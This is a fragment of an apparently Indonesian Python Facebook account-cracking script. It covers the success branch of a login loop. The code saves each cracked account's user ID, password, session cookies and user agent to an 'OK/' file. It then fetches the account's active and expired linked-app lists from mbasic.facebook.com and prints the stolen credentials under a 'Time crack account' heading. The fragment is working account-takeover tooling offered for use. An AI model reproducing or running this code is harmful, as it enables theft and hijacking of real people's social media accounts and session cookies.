				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				tree.add(f"{H3}{kuki}{P2}")
				tree.add(f"{P2}Active Apk {P2} :                                                  {H2}{infoakun}")
				tree.add(f"{P2}Time crack account {P2} : {H2}{thn}")
				cetak(tree)
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	DYNO()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#